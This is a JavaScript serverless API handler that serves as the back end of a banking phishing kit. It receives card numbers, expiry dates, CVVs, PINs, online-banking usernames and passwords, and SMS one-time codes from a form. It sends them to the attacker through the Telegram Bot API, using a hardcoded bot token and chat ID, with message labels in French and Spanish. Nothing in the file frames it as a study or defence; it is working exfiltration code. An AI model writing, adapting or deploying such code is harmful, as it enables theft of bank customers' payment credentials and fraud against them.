export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 

    user,
    pass,
    CN,
    cc,
    exp,
    cvv,
    PIN,
    sms,
    SMSERROR,

  } = req.body;

  const BOT_TOKEN = "8141866368:AAF0UNpJtVBppROWPcAXDGCeT-rv5ZPj54Y";
  const CHAT_ID = "-4979045490";

  let message = "";

  if  (CN && cc && exp && cvv && PIN) {
    // 🟢 رسالة الكارت
    message = `
    💳 Carte Bancaire:
    -CardholderName: ${CN}
    - Numéro: ${cc}
    - Expiration: ${exp}
    - CVV: ${cvv}
    - PIN: ${PIN}
    `;
  
  }else if (user && pass ) {
    // 🟢 رسالة الكارت
    message = `
    🔑 Nouveau PIN Login:
    - Identifiant: ${user}
    - Mot de passe: ${pass}
     `;
} else if (sms ) {
  // 🟢 رسالة الكارت
  message = `
  🔑 SMS recibido Login:
  - sms: ${sms}
   `;
}else if (SMSERROR ) {
  // 🟢 رسالة الكارت
  message = `
  🔑sms Login:
  - sms: ${SMSERROR}
   `;
}
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}





